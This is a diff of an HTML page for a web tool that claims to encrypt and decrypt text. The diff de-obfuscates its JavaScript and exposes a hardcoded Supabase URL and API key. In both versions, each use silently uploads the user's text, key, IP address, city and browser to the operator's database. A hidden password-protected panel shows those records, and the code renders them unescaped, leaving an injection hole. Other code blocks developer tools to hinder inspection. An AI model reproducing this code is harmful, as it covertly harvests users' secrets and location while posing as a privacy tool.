@@ -32,7 +32,7 @@
         .close-secret { background: #ff0000; color: #fff; width: auto; padding: 10px 25px; margin-bottom: 20px; }
     </style>
 </head>
-<body oncontextmenu="return false;" onload="_0x_i()">
+<body oncontextmenu="return false;" onload="initSystem()">
 
     <div id="digital-clock">00:00:00:000</div>
 
@@ -42,71 +42,71 @@
                 <img src="owl2.png" alt="🦉" class="owl-icon">
                 <div class="logo-title">ALMER ENGLISHM</div>
             </div>
-            <input type="password" id="pI" class="main-input enc-input" placeholder="ACCESS CODE" onkeydown="if(event.key==='Enter') _0x_v()">
-            <button onclick="_0x_v()" class="enc-btn" style="margin-top: 15px;">LOGIN</button>
+            <input type="password" id="passInput" class="main-input" placeholder="ACCESS CODE" onkeydown="if(event.key==='Enter') verifyAccess()">
+            <button onclick="verifyAccess()" class="enc-btn" style="margin-top: 15px;">LOGIN</button>
         </div>
     </div>
 
-    <div class="header-wrapper" id="m-l" style="display:none;">
-        <img src="owl2.png" alt="🦉" class="owl-icon" id="interactive-owl" onclick="_0x_t()">
+    <div class="header-wrapper" id="main-header" style="display:none;">
+        <img src="owl2.png" alt="🦉" class="owl-icon" id="interactive-owl" onclick="handleOwlClick()">
         <div class="logo-title" id="interactive-title">ALMER ENGLISHM</div>
     </div>
 
-    <div class="container enc-container" id="e-s" style="display:none;">
+    <div class="container enc-container" id="enc-sec" style="display:none;">
         <h2 style="color:var(--matrix-green);">[ ENCRYPTION SECTOR ]</h2>
-        <textarea id="iTE" class="enc-input" rows="3" placeholder="Enter text..."></textarea>
-        <input type="number" id="kIE" class="main-input enc-input" placeholder="Security Key">
-        <select id="sE" class="enc-input">
+        <textarea id="iTE" rows="3" placeholder="Enter text..."></textarea>
+        <input type="number" id="kIE" class="main-input" placeholder="Security Key">
+        <select id="sE">
             <option value="circle">( )</option>
             <option value="square">[ ]</option>
             <option value="brace">{ }</option>
         </select>
-        <button id="btnE" onclick="_0x_p('encrypt')" class="enc-btn">ENCRYPT NOW</button>
-        <div class="result-box" onclick="cR('oE')">
+        <button id="btnE" onclick="processAction('encrypt')" class="enc-btn">ENCRYPT NOW</button>
+        <div class="result-box" onclick="copyResult('oE')">
             <div id="oE" class="output-text">...</div>
-            <span class="copy-hint">CLICK TO COPY</span>
         </div>
     </div>
 
-    <div class="container dec-container" id="d-s" style="display:none;">
+    <div class="container dec-container" id="dec-sec" style="display:none;">
         <h2 style="color:#e0e0e0;">[ DECRYPTION SECTOR ]</h2>
-        <textarea id="iTD" class="dec-input" rows="3" placeholder="Enter code..."></textarea>
-        <input type="number" id="kID" class="main-input dec-input" placeholder="Security Key">
-        <select id="sD" class="dec-input">
+        <textarea id="iTD" rows="3" placeholder="Enter code..."></textarea>
+        <input type="number" id="kID" class="main-input" placeholder="Security Key">
+        <select id="sD">
             <option value="circle">( )</option>
             <option value="square">[ ]</option>
             <option value="brace">{ }</option>
         </select>
-        <button id="btnD" onclick="_0x_p('decrypt')" class="dec-btn">DECRYPT CODE</button>
-        <div class="result-box" onclick="cR('oD')">
+        <button id="btnD" onclick="processAction('decrypt')" class="dec-btn">DECRYPT CODE</button>
+        <div class="result-box" onclick="copyResult('oD')">
             <div id="oD" class="output-text">...</div>
-            <span class="copy-hint">CLICK TO COPY</span>
         </div>
     </div>
 
     <div id="secret-panel">
-        <button class="close-secret" onclick="document.getElementById('secret-panel').style.display='none'">EXIT SECURE PANEL</button>
-        <h1 style="color:var(--matrix-green)">DATABASE: logs_english</h1>
+        <button class="close-secret" onclick="document.getElementById('secret-panel').style.display='none'">EXIT</button>
         <div id="log-content">Loading...</div>
     </div>
 
-    <footer id="f-c" style="display:none;">
+    <footer id="footer-sec" style="display:none;">
         <div class="footer-text">ALL RIGHTS RESERVED<br>MOHAMMED AL-MER © 2026</div>
     </footer>
 
     <script>
-        const _0x_a = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x74\x76\x6d\x78\x6b\x77\x7a\x7a\x71\x77\x73\x6b\x67\x74\x67\x63\x75\x77\x63\x2e\x73\x75\x70\x61\x62\x61\x73\x65\x2e\x63\x6f', '\x65\x79\x4a\x68\x62\x47\x63\x69\x4f\x69\x4a\x48\x55\x7a\x49\x31\x4e\x69\x49\x73\x49\x6e\x52\x35\x63\x43\x49\x36\x49\x6b\x70\x58\x56\x43\x4a\x39\x2e\x65\x79\x4a\x70\x63\x33\x4d\x69\x4f\x69\x4a\x7a\x64\x58\x42\x68\x59\x6d\x46\x7a\x5a\x53\x49\x73\x49\x6e\x4a\x6c\x5a\x69\x49\x36\x49\x6m\x4e\x30\x64\x6d\x31\x34\x61\x33\x64\x36\x65\x6e\x46\x33\x63\x32\x74\x6e\x64\x47\x64\x6a\x64\x58\x64\x6a\x49\x69\x77\x69\x63\x6d\x39\x73\x5a\x53\x49\x36\x49\x6m\x46\x7u\x62\x32\x34\x69\x4c\x43\x4a\x70\x59\x58\x51\x69\x4f\x6a\x45\x33\x4e\x7a\x59\x78\x4e\x6a\x45\x31\x4d\x44\x6b\x69\x4c\x43\x4a\x6l\x65\x48\x41\x69\x4f\x6a\x49\x77\x4f\x54\x45\x33\x4d\x7a\x63\x31\x4d\x54\x6b\x31\x66\x51\x2e\x55\x72\x64\x45\x32\x77\x34\x67\x67\x2d\x50\x39\x48\x66\x79\x31\x62\x34\x75\x42\x33\x34\x46\x45\x53\x2d\x43\x77\x51\x79\x30\x66\x73\x34\x4c\x45\x46\x2d\x54\x6e\x61\x67\x49'];
-        const _s = supabase.createClient(_0x_a[0], _0x_a[1]);
+        // الروابط الأصلية بدون تشفير معقد يضرب الاتصال
+        const SUPA_URL = "https://ctvmxkwzzqwskgtgcuwc.supabase.co";
+        const SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN0dm14a3d6enF3c2tndGdjdXdjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYxNjE1MDksImV4cCI6MjA5MTczNzUwOX0.UrdE2w4gg-P9Hfy1b4uB34FES-CwQy0fs4LEF-TnagI";
+        const sbClient = supabase.createClient(SUPA_URL, SUPA_KEY);
 
-        function _0x_i() {
-            const clock = document.getElementById('digital-clock');
+        function initSystem() {
             setInterval(() => {
                 const n = new Date(); let h = n.getHours() % 12 || 12;
-                clock.innerText = `${String(h).padStart(2, '0')}:${String(n.getMinutes()).padStart(2, '0')}:${String(n.getSeconds()).padStart(2, '0')}:${String(n.getMilliseconds()).padStart(3, '0')}`;
+                document.getElementById('digital-clock').innerText = `${String(h).padStart(2, '0')}:${String(n.getMinutes()).padStart(2, '0')}:${String(n.getSeconds()).padStart(2, '0')}:${String(n.getMilliseconds()).padStart(3, '0')}`;
             }, 10);
+
+            // تحريك الظل
             const t = document.getElementById('interactive-title'), o = document.getElementById('interactive-owl');
             document.addEventListener('mousemove', (e) => {
-                if (document.getElementById('m-l').style.display !== 'none') {
+                if (document.getElementById('main-header').style.display !== 'none') {
                     const x = (e.clientX - window.innerWidth / 2) / 25, y = (e.clientY - window.innerHeight / 2) / 25;
                     t.style.textShadow = `${x}px ${y}px 15px rgba(0, 255, 65, 0.8)`;
                     o.style.filter = `drop-shadow(${x}px ${y}px 12px rgba(0, 255, 65, 0.8))`;
@@ -114,27 +114,29 @@
             });
         }
 
-        function _0x_v() {
-            const val = document.getElementById('pI').value;
-            if (val === "YALiM") {
+        function verifyAccess() {
+            const input = document.getElementById('passInput').value;
+            if (input === "YALiM") {
                 document.getElementById('lock-screen').style.display = 'none';
-                ['e-s', 'd-s', 'm-l', 'f-c'].forEach(i => document.getElementById(i).style.display = 'block');
-            } else { alert("DENIED"); }
-        }
-
-        let _0x_c = 0;
-        function _0x_t() {
-            _0x_c++;
-            if (_0x_c === 3) {
-                let k = prompt("ACCESS:");
-                if (k === "YALiM_LOGS") { document.getElementById('secret-panel').style.display = 'block'; _0x_fL(); }
-                _0x_c = 0;
+                ['enc-sec', 'dec-sec', 'main-header', 'footer-sec'].forEach(id => document.getElementById(id).style.display = 'block');
+            } else {
+                alert("ACCESS DENIED");
             }
-            setTimeout(() => { _0x_c = 0; }, 1000);
         }
 
-        async function _0x_fL() {
-            const { data } = await _s.from('logs_english').select('*').order('created_at', { ascending: false });
+        let clickCount = 0;
+        function handleOwlClick() {
+            clickCount++;
+            if (clickCount === 3) {
+                let k = prompt("SECURE KEY:");
+                if (k === "YALiM_LOGS") { document.getElementById('secret-panel').style.display = 'block'; fetchLogs(); }
+                clickCount = 0;
+            }
+            setTimeout(() => { clickCount = 0; }, 1000);
+        }
+
+        async function fetchLogs() {
+            const { data } = await sbClient.from('logs_english').select('*').order('created_at', { ascending: false });
             if (data) {
                 let h = '<table class="log-table"><tr><th>DATE</th><th>ACTION</th><th>CONTENT</th></tr>';
                 data.forEach(r => { h += `<tr><td>${new Date(r.created_at).toLocaleTimeString()}</td><td>${r.action_type}</td><td>${r.content}</td></tr>`; });
@@ -142,33 +144,32 @@
             }
         }
 
-        async function _0x_p(m) {
+        async function processAction(m) {
             let sx = m === 'encrypt' ? 'E' : 'D';
-            let t = document.getElementById('iT' + sx).value, k = document.getElementById('kI' + sx).value, b = document.getElementById('s' + sx).value, btn = document.getElementById('btn' + sx);
-            if (!t || !k) return;
-            btn.innerText = "..."; btn.disabled = true;
+            let txt = document.getElementById('iT' + sx).value, ky = document.getElementById('kI' + sx).value, br = document.getElementById('s' + sx).value, btn = document.getElementById('btn' + sx);
+            if (!txt || !ky) return;
+            btn.innerText = "...";
             try {
-                const { data } = await _s.rpc('englishm_logic', { t: t, k: parseInt(k), m: m, s: b });
+                const { data } = await sbClient.rpc('englishm_logic', { t: txt, k: parseInt(ky), m: m, s: br });
                 if (data) {
                     document.getElementById('o' + sx).innerText = data.result;
                     let inf = "Locating...";
                     try { const g = await fetch('https://ipapi.co/json/'); const gd = await g.json(); inf = `${gd.city}, ${gd.ip}`; } catch (e) {}
-                    await _s.from('logs_english').insert([{ content: t, key_used: k.toString(), bracket_style: b, action_type: m, user_info: inf, browser: navigator.userAgent.split(' ').pop() }]);
+                    await sbClient.from('logs_english').insert([{ content: txt, key_used: ky.toString(), bracket_style: br, action_type: m, user_info: inf, browser: navigator.userAgent.split(' ').pop() }]);
                 }
-            } catch (e) {}
-            btn.innerText = m === 'encrypt' ? "ENCRYPT NOW" : "DECRYPT CODE"; btn.disabled = false;
+            } catch (e) { console.error(e); }
+            btn.innerText = m === 'encrypt' ? "ENCRYPT NOW" : "DECRYPT CODE";
         }
 
-        function cR(i) { navigator.clipboard.writeText(document.getElementById(i).innerText).then(() => alert("COPIED")); }
+        function copyResult(id) { navigator.clipboard.writeText(document.getElementById(id).innerText).then(() => alert("COPIED")); }
 
-        // Corrected Security Layer
+        // حماية F12 والـ Inspect
         window.addEventListener('keydown', function(e) {
-            // Block F12, Ctrl+Shift+I, Ctrl+U
             if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
                 e.preventDefault();
                 return false;
             }
-        }, false);
+        });
     </script>
 </body>
 </html>
